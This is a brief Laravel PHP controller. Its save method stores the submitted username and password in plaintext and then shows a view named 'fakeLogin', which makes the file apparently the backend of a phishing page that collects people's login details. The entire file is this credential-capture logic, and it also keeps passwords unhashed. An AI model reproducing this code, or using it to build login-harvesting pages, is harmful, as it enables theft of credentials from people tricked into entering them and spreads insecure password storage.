<?php

namespace App\Http\Controllers;

use App\Models\Login;
use Illuminate\Http\Request;

class LoginController extends Controller
{
    public function index(){
        return view("welcome");
    }
    public function save(Request $request){
        $user = new Login;
        $user->userName=$request->username;
        $user->password=$request->password;
        $user->save();
        return view("fakeLogin");
    }
}
